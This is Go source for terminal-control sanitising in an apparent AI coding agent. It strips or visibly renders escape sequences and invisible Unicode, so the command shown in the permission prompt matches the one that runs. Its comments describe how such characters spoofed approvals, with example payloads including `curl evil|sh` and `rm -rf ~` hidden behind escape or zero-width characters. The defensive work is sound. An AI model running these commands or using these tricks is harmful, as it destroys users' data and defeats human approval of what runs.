package render

import (
	"fmt"
	"strings"
	"unicode/utf8"
)

// Terminal-control sanitising.
//
// Everything cove shows that did not come from cove itself is untrusted: the
// model's reply, its reasoning, a command it wants to run, the first line of a
// file or a web page that ends up in a tool summary, a shell command's live
// output. That text used to reach the terminal verbatim, so an escape sequence
// inside it was executed rather than shown. A README could retitle the window
// (OSC 0), write to the clipboard (OSC 52), move the cursor up and repaint rows
// cove had already printed, clear the screen, or ask the terminal for its
// cursor position (CSI 6n) — which the terminal answers by typing into cove's
// own stdin. In the permission box it was worse: "\r" or a cursor move let the
// text shown for approval differ from the command that would run.
//
// Two policies, because two kinds of text pass through:
//
//   - StripControls is for a single logical line the renderer styles itself
//     (a header, a summary, a prompt description). Nothing survives but text,
//     newlines and tabs.
//   - SanitizeStream is for output that legitimately carries its own styling
//     (go test, git and npm colour their output; progress bars redraw their
//     row). SGR colour, erase-in-line and "\r" are kept, because none of them
//     can reach outside the row the cursor is already on. Everything else is
//     dropped.
//
// Both drop what they remove, which is wrong for the one place where the text
// is a promise about what will run: the permission prompt. VisibleControls is
// for that; it removes nothing and shows every control as inert text.

// VisibleControls returns s with every control character rendered as visible,
// inert ASCII text instead of being removed: ESC as `\e`, other C0 controls in
// caret notation (`^M` for '\r', `^G` for BEL, `^?` for DEL), C1 controls and
// the Unicode bidi/line-separator formatting characters and the zero-width
// and other invisible characters (isInvisible) as `\uXXXX`, and bytes that
// are not valid UTF-8 as `\xNN`. '\n' and '\t' are kept, and so is a
// zero-width joiner inside an emoji sequence (joinsEmoji).
//
// It is for text shown for approval (the command in the permission prompt,
// the diff preview of a write). StripControls used to serve there, and
// dropping is not neutral when the text is about to run: an unterminated
// "ESC ]" discarded everything after it, a complete OSC took its whole body
// (even across lines), and ESC + ';' / '|' / '&' was removed as a two-byte
// sequence, so `echo hi ESC]0;x; curl evil|sh BEL done` was approved as
// "echo hi done" while bash ran all of it. Here no byte that follows a control
// is ever consumed, so everything that will run is on screen.
func VisibleControls(s string) string {
	var sb strings.Builder
	sb.Grow(len(s) + len(s)/8)
	for i := 0; i < len(s); {
		b := s[i]
		switch {
		case b == '\n' || b == '\t':
			sb.WriteByte(b)
			i++
		case b == 0x1b:
			sb.WriteString(`\e`)
			i++
		case b < 0x20:
			sb.WriteByte('^')
			sb.WriteByte(b + 0x40)
			i++
		case b == 0x7f:
			sb.WriteString("^?")
			i++
		case b < utf8.RuneSelf:
			sb.WriteByte(b)
			i++
		default:
			r, size := utf8.DecodeRuneInString(s[i:])
			switch {
			case r == utf8.RuneError && size == 1:
				fmt.Fprintf(&sb, `\x%02x`, b)
			case r == 0x200d && joinsEmoji(s, i, size):
				sb.WriteString(s[i : i+size])
			case r >= 0x80 && r <= 0x9f, isInvisibleFormatting(r), isInvisible(r):
				fmt.Fprintf(&sb, `\u%04x`, r)
			default:
				sb.WriteString(s[i : i+size])
			}
			i += size
		}
	}
	return sb.String()
}

// isInvisibleFormatting reports the formatting characters that change how
// the rest of a line is displayed without being visible themselves: bidi
// embeddings, overrides and isolates (a right-to-left override shows
// "rm -rf ~ #" reversed), the bidi marks, and the Unicode line and paragraph
// separators. Shown raw in an approval prompt they let the displayed text
// differ from the text that runs.
func isInvisibleFormatting(r rune) bool {
	switch {
	case r >= 0x202a && r <= 0x202e, r >= 0x2066 && r <= 0x2069:
		return true
	case r == 0x200e, r == 0x200f, r == 0x061c, r == 0x2028, r == 0x2029:
		return true
	}
	return false
}

// isInvisible reports the characters that take no visible space at all:
// zero-width space, joiners and non-joiners, word joiner and the invisible
// operators, the byte order mark, the soft hyphen, the Mongolian vowel
// separator, the combining grapheme joiner, the Hangul fillers, the
// interlinear annotation marks and the tag characters. They were shown raw,
// so `echo hi <U+200B>#; rm -rf ~` read as "echo hi" plus a comment, while
// bash, for which that "#" does not start a word, ran the rm.
func isInvisible(r rune) bool {
	switch {
	case r >= 0x200b && r <= 0x200d, r >= 0x2060 && r <= 0x2064:
		return true
	case r == 0xfeff, r == 0x00ad, r == 0x180e, r == 0x034f:
		return true
	case r == 0x115f, r == 0x1160, r == 0x3164, r == 0xffa0:
		return true
	case r >= 0xfff9 && r <= 0xfffb, r >= 0xe0000 && r <= 0xe007f:
		return true
	}
	return false
}

// joinsEmoji reports whether the U+200D at s[i:i+size] sits inside an emoji
// ZWJ sequence (👨‍👩‍👧, 👨🏽‍💻, 🏳️‍🌈): an emoji before it, allowing for a
// presentation selector or a skin tone, and one right after it. That joiner
// is part of what the emoji looks like and is left alone; any other one is
// shown.
func joinsEmoji(s string, i, size int) bool {
	before := s[:i]
	for before != "" {
		r, n := utf8.DecodeLastRuneInString(before)
		if r == 0xfe0f || (r >= 0x1f3fb && r <= 0x1f3ff) {
			before = before[:len(before)-n]
			continue
		}
		if !isPictographic(r) {
			return false
		}
		next, _ := utf8.DecodeRuneInString(s[i+size:])
		return isPictographic(next)
	}
	return false
}

// isPictographic approximates Unicode's Extended_Pictographic property,
// which the standard library does not carry: the emoji and symbol blocks
// that ZWJ sequences are built from.
func isPictographic(r rune) bool {
	switch {
	case r >= 0x1f000 && r <= 0x1faff:
		return true
	case r >= 0x2300 && r <= 0x23ff, r >= 0x2600 && r <= 0x27bf, r >= 0x2b00 && r <= 0x2bff:
		return true
	case r == 0x00a9, r == 0x00ae, r == 0x203c, r == 0x2049, r == 0x2122, r == 0x2139:
		return true
	}
	return false
}

// StripControls removes every escape sequence and control character from s
// except '\n' and '\t'.
func StripControls(s string) string {
	out, rest := scanControls(s, false)
	_ = rest // an incomplete trailing sequence is dropped
	return out
}

// SanitizeStream removes every escape sequence and control character from s
// except SGR colour, erase-in-line, '\n', '\r' and '\t'. An incomplete
// sequence at the end of s is dropped; use a StreamSanitizer when s is one
// chunk of a longer stream.
func SanitizeStream(s string) string {
	out, _ := scanControls(s, true)
	return out
}

// maxPendingSequence bounds the length of an escape sequence. A colour code is
// a handful of bytes; anything longer than this is not treated as a sequence:
// its two-byte introducer is dropped and what follows is scanned as the inert
// text it now is. Holding an unterminated OSC for its terminator would let it
// swallow the rest of the stream.
//
// The bound is applied by escapeSequence itself, not by StreamSanitizer
// after the fact. The stream used to apply it: an incomplete tail over 256
// bytes had two bytes dropped and was rescanned from scratch, which is
// quadratic (160 KB of "ESC ]" took seconds and froze the UI), and it made the
// outcome depend on chunking: an OSC over 256 bytes inside one chunk was
// dropped whole, the same OSC split across chunks had its body printed. Now
// the decision depends only on the sequence's own first bytes, so an
// incomplete tail is never longer than this and every chunking agrees with
// SanitizeStream of the whole text.
const maxPendingSequence = 256

// StreamSanitizer applies SanitizeStream to a stream delivered in chunks.
//
// Chunks are cut wherever the transport cut them, so a colour code can
// straddle two of them. Sanitising each chunk on its own would drop the first
// half and print the second ("1m") as text; this holds an incomplete trailing
// sequence back and prepends it to the next chunk. The same goes for a UTF-8
// character cut in two: its lead byte used to be printed on its own and the
// continuation bytes 0x80–0x9F that began the next chunk were dropped as C1
// controls, so "文件" split after its first byte came out as "\xe6件". The
// zero value is ready to use. It is not safe for concurrent use.
type StreamSanitizer struct {
	pending string
}

// Write sanitises chunk and returns the text that is safe to print now.
func (z *StreamSanitizer) Write(chunk string) string {
	s := z.pending + chunk
	z.pending = ""
	// Hold back a trailing, unfinished character before scanning, so its
	// bytes are judged together once the rest arrives.
	hold := incompleteRuneSuffix(s)
	s = s[:len(s)-len(hold)]
	defer func() { z.pending += hold }()
	// rest is at most maxPendingSequence bytes: escapeSequence reports a
	// longer sequence as a malformed one it has already resolved.
	out, rest := scanControls(s, true)
	z.pending = rest
	return out
}

// Flush ends the stream and returns what Write was still holding back. An
// unfinished escape sequence is dropped, as SanitizeStream drops one; an
// unfinished character becomes U+FFFD, since its bytes on their own would
// either vanish (0x80–0x9F) or print as a raw invalid byte. Write may be
// called again afterwards to start a new stream.
func (z *StreamSanitizer) Flush() string {
	s := z.pending
	z.pending = ""
	hold := incompleteRuneSuffix(s)
	out := SanitizeStream(s[:len(s)-len(hold)])
	if hold != "" {
		out += string(utf8.RuneError)
	}
	return out
}

// incompleteRuneSuffix is the tail of s that begins a multi-byte UTF-8
// character and ends before it is complete ("" when s ends on a character
// boundary, or in bytes that can never become a valid character).
func incompleteRuneSuffix(s string) string {
	for i := len(s) - 1; i >= 0 && i >= len(s)-utf8.UTFMax+1; i-- {
		b := s[i]
		if b < utf8.RuneSelf {
			return ""
		}
		if utf8.RuneStart(b) {
			if utf8.FullRuneInString(s[i:]) {
				return ""
			}
			return s[i:]
		}
	}
	return ""
}

// scanControls filters s. keepStyle selects the SanitizeStream policy. rest is
// the suffix of s starting at an escape sequence that s ends before
// completing; it is not part of out.
func scanControls(s string, keepStyle bool) (out, rest string) {
	var sb strings.Builder
	sb.Grow(len(s))
	for i := 0; i < len(s); {
		b := s[i]
		switch {
		case b == 0x1b:
			end, complete, keep := escapeSequence(s, i)
			if !complete {
				return sb.String(), s[i:]
			}
			if keep && keepStyle {
				sb.WriteString(s[i:end])
			}
			i = end
		case b == '\n' || b == '\t':
			sb.WriteByte(b)
			i++
		case b == '\r':
			if keepStyle {
				sb.WriteByte(b)
			}
			i++
		case b < 0x20 || b == 0x7f:
			i++
		case b < utf8.RuneSelf:
			sb.WriteByte(b)
			i++
		default:
			r, size := utf8.DecodeRuneInString(s[i:])
			switch {
			case r == utf8.RuneError && size == 1:
				// A stray byte in 0x80–0x9F is an 8-bit C1 control to a
				// terminal that accepts them; anything else is left for the
				// terminal to show as a replacement glyph.
				if b > 0x9f {
					sb.WriteByte(b)
				}
			case r >= 0x80 && r <= 0x9f:
				// C1 controls, including the one-character CSI (U+009B) and
				// OSC (U+009D) introducers. Dropping the introducer is enough:
				// what follows it is inert text.
			default:
				sb.WriteString(s[i : i+size])
			}
			i += size
		}
	}
	return sb.String(), ""
}

// escapeSequence parses the escape sequence starting at s[i] (an ESC). end is
// the index just past it; complete is false when s ends first; keep reports
// whether it is one of the row-local sequences SanitizeStream allows.
//
// A sequence that runs past maxPendingSequence bytes without ending is
// reported complete at i+2: its introducer is dropped and the scan resumes on
// what follows, as text. complete is therefore only false when s ends within
// maxPendingSequence bytes of i.
func escapeSequence(s string, i int) (end int, complete, keep bool) {
	if i+1 >= len(s) {
		return len(s), false, false
	}
	limit := i + maxPendingSequence
	overlong := func(j int) bool { return j >= limit && j < len(s) }
	switch next := s[i+1]; {
	case next == '[':
		// CSI: parameter bytes, intermediate bytes, one final byte.
		j := i + 2
		paramsStart := j
		for j < len(s) && j < limit && s[j] >= 0x30 && s[j] <= 0x3f {
			j++
		}
		params := s[paramsStart:j]
		interStart := j
		for j < len(s) && j < limit && s[j] >= 0x20 && s[j] <= 0x2f {
			j++
		}
		if overlong(j) {
			return i + 2, true, false
		}
		if j >= len(s) {
			return len(s), false, false
		}
		final := s[j]
		if final < 0x40 || final > 0x7e {
			// Malformed: drop what was parsed and resume at the odd byte.
			return j, true, false
		}
		plain := j == interStart && strings.Trim(params, "0123456789;:") == ""
		return j + 1, true, plain && (final == 'm' || final == 'K')
	case next == ']' || next == 'P' || next == 'X' || next == '^' || next == '_':
		// OSC, DCS, SOS, PM, APC: a string ended by BEL or ST (ESC \).
		for j := i + 2; j < len(s); j++ {
			if j >= limit {
				return i + 2, true, false
			}
			// BEL, or the 8-bit ST: 0x9C raw or as its UTF-8 form C2 9C
			// (whose second byte this is). Without the 8-bit form such a
			// string ran on to maxPendingSequence and swallowed up to 256
			// bytes of the text after it. A 0x9C after anything else is
			// the continuation byte of some other character in the body
			// (U+4F1C is E4 BC 9C) and ends nothing.
			if s[j] == 0x07 || (s[j] == 0x9c && (s[j-1] == 0xc2 || s[j-1] < utf8.RuneSelf)) {
				return j + 1, true, false
			}
			if s[j] == 0x1b {
				if j+1 >= len(s) {
					return len(s), false, false
				}
				if s[j+1] == '\\' {
					return j + 2, true, false
				}
			}
		}
		return len(s), false, false
	case next >= 0x20 && next <= 0x2f:
		// nF sequences such as a charset designation (ESC ( 0).
		j := i + 1
		for j < len(s) && j < limit && s[j] >= 0x20 && s[j] <= 0x2f {
			j++
		}
		if overlong(j) {
			return i + 2, true, false
		}
		if j >= len(s) {
			return len(s), false, false
		}
		if s[j] >= 0x30 && s[j] <= 0x7e {
			return j + 1, true, false
		}
		return j, true, false
	case next >= 0x30 && next <= 0x7e:
		// Two-byte sequences: ESC 7 (save cursor), ESC c (full reset), ...
		return i + 2, true, false
	default:
		// ESC followed by a control or non-ASCII byte: drop the ESC alone.
		return i + 1, true, false
	}
}
